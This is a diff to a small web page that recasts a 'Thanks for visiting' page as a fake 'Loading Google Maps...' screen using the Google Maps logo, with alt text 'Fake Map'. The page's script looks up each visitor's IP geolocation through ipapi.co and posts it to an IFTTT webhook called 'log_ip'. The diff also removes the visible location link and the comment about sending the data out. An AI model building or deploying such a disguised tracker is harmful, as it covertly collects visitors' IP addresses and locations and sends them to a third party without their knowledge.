@@ -1,12 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Welcome</title>
+  <title>Google Maps</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 80px;
+      background-color: #f2f2f2;
+    }
+    img {
+      width: 80%;
+      max-width: 600px;
+      border: 2px solid #ccc;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    }
+  </style>
 </head>
 <body>
-  <h1>Thanks for visiting!</h1>
-  <p>You're being redirected... or click below:</p>
-  <p><a id="mapLink" href="#" target="_blank">📍 View on Google Maps</a></p>
+  <h1>Loading Google Maps...</h1>
+  <p>If the map doesn't load, <a href="https://maps.google.com" target="_blank">click here</a>.</p>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Google_Maps_logo_2020.svg/512px-Google_Maps_logo_2020.svg.png" alt="Fake Map">
 
   <script>
     fetch("https://ipapi.co/json")
@@ -22,10 +36,6 @@
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
         const timestamp = new Date().toISOString();
 
-        // Show the Google Maps link on the page
-        document.getElementById("mapLink").href = mapsLink;
-
-        // Send data to IFTTT
         fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
           method: "POST",
           headers: {
